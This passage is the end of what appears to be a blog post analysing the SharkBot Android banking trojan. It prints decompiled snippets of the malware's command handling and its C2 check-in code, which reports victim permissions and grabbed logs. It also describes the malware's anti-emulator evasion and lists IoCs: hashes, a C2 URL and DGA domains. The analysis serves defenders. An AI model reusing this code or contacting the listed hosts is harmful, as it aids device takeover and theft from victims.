                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"makeSwipe"</span><span class="p">)</span> <span class="p">?</span> <span class="m">3</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="m">0x4C6F0AFD</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"removeApp"</span><span class="p">)</span> <span class="p">?</span> <span class="m">11</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="m">1979901105</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"sendSMS"</span><span class="p">)</span> <span class="p">?</span> <span class="m">10</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">default</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
</code></pre></div></div>

<h1 id="communication-with-c2">Communication with C2</h1>

<p>The malware will communicate with C2 server and <code class="language-plaintext highlighter-rouge">POST</code> request with information about the victim’s device.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span> <span class="p">{</span>
                <span class="n">App</span> <span class="n">app0</span> <span class="p">=</span> <span class="n">App</span><span class="p">.</span><span class="nf">m</span><span class="p">();</span>
                <span class="n">aa</span> <span class="n">aa0</span> <span class="p">=</span> <span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">();</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"botID"</span><span class="p">,</span> <span class="n">aa0</span><span class="p">.</span><span class="n">C</span><span class="p">);</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"statusScreen"</span><span class="p">,</span> <span class="n">aa0</span><span class="p">.</span><span class="nf">h</span><span class="p">(</span><span class="n">app0</span><span class="p">));</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"pDoze"</span><span class="p">,</span> <span class="p">((</span><span class="n">boolean</span><span class="p">)(</span><span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="nf">m</span><span class="p">(</span><span class="n">App</span><span class="p">.</span><span class="nf">m</span><span class="p">())</span> <span class="p">?</span> <span class="m">0</span> <span class="p">:</span> <span class="m">1</span><span class="p">)));</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"pDefaultSms"</span><span class="p">,</span> <span class="n">aa0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">app0</span><span class="p">));</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"pDrawOverlays"</span><span class="p">,</span> <span class="n">Settings</span><span class="p">.</span><span class="nf">canDrawOverlays</span><span class="p">(</span><span class="n">app0</span><span class="p">));</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"pOpenOverlays"</span><span class="p">,</span> <span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="nf">m</span><span class="p">());</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"pAccessibility"</span><span class="p">,</span> <span class="n">aa0</span><span class="p">.</span><span class="nf">m</span><span class="p">(</span><span class="n">app0</span><span class="p">,</span> <span class="n">ServiceHandler</span><span class="p">.</span><span class="k">class</span><span class="err">));</span>
                <span class="nc">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"pNotification"</span><span class="p">,</span> <span class="n">aa0</span><span class="p">.</span><span class="nf">M</span><span class="p">(</span><span class="n">app0</span><span class="p">));</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"pSendSMS"</span><span class="p">,</span> <span class="n">aa0</span><span class="p">.</span><span class="nf">m</span><span class="p">(</span><span class="n">app0</span><span class="p">,</span> <span class="s">"android.permission.SEND_SMS"</span><span class="p">));</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"configOverlayReopen"</span><span class="p">,</span> <span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="n">a</span><span class="p">);</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"AntiDelete"</span><span class="p">,</span> <span class="n">ServiceHandler</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="n">m</span><span class="p">);</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"time_knock"</span><span class="p">,</span> <span class="n">aa0</span><span class="p">.</span><span class="n">I</span><span class="p">);</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"versionLib"</span><span class="p">,</span> <span class="n">aa0</span><span class="p">.</span><span class="n">J</span><span class="p">);</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"hash"</span><span class="p">,</span> <span class="n">aa0</span><span class="p">.</span><span class="n">D</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="s">"hash"</span><span class="p">));</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"admin_url"</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">j</span><span class="p">);</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"configNotification"</span><span class="p">,</span> <span class="n">aa0</span><span class="p">.</span><span class="n">f</span><span class="p">);</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"configSaveSMS"</span><span class="p">,</span> <span class="n">aa0</span><span class="p">.</span><span class="n">l</span><span class="p">);</span>
                <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"logsGrabber"</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="nf">m</span><span class="p">(</span><span class="n">App</span><span class="p">.</span><span class="nf">m</span><span class="p">()).</span><span class="nf">m</span><span class="p">());</span>
                <span class="k">if</span><span class="p">(!</span><span class="n">jSONObject0</span><span class="p">.</span><span class="nf">has</span><span class="p">(</span><span class="s">"logsSniffer"</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"logsSniffer"</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="nf">m</span><span class="p">(</span><span class="n">App</span><span class="p">.</span><span class="nf">m</span><span class="p">()).</span><span class="nf">m</span><span class="p">());</span>
                <span class="p">}</span>
</code></pre></div></div>

<h1 id="anti-emulator">Anti-emulator</h1>

<p>The malware try to make it harder on malware analysts to analyze a malware. When the malware is installed on the device, it checks if it’s installed on an emulator or not. If the emulator is detected, then the app won’t launch and it won’t communicate with the C2 server.</p>

<p align="center">
  <img src="/assets/images/MA/sharkbot/3.gif" />
</p>
<center><font size="3"> <u>Figure</u>(2) Show how Sharkbot exits when there's an emulator<u></u> </font></center>
<p><br /></p>

<h1 id="ioc">IoC</h1>

<p>package name: com.ohalqpdj.discopet</p>

<p>Hashes:</p>

<p>Old sample: <code class="language-plaintext highlighter-rouge">d05fb8c6899c96d1519e46eaea848ead6a17c7ddd0e20228e83c1aa9f264011d</code></p>

<p>new sample v2.6: <code class="language-plaintext highlighter-rouge">bf3fcdba7148627abfed402d038c99d3b2e60cd87cd04fe22b6ea3aac5ac9151</code></p>

<p>C2:</p>

<p>http://f3eac8de096e59ca.live/</p>

<p>C2 generated by DGA:</p>

<p>8d6102613d7d4ccc.xyz</p>

<p>3634b259b56f2866.live</p>

<p>04ff9f101c72a417.com</p>

<p>b5c4f49eae222c10.store</p>

<p>e30a26a32a8020f1.info</p>

<p>6d829850c8eb7892.top</p>

<p>efd909761db065cf.net</p>

<h1 id="article-quote">Article quote</h1>

<blockquote>
  <p>قَدرُك على قَدرِ بَذْلِك</p>
</blockquote>

<h1 id="ref">REF</h1>

<p>1- <a href="https://tria.ge/220906-w626tseffn">Hatching report</a></p>

<p>2- <a href="https://blog.fox-it.com/2022/03/03/sharkbot-a-new-generation-android-banking-trojan-being-distributed-on-google-play-store/">SharkBot: a new generation Android banking Trojan being distributed on Google Play Store</a></p>


        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#malware-analysis" class="page__taxonomy-item" rel="tag">Malware-analysis</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-09-06T00:00:00+00:00">September 6, 2022</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=Technical+analysis+of+SharkBot+android+malware%20https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Fsharkbot%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Fsharkbot%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Fsharkbot%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/malware-analysis/sova/" class="pagination--pager" title="Technical analysis of SOVA android malware
">Previous</a>
    
    
      <a href="/malware-analysis/hydra/" class="pagination--pager" title="Technical analysis of Hydra android malware
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2023 Muhammad Hasan Ali. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-9P532HWLYQ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-9P532HWLYQ');
</script>








  </body>
</html>
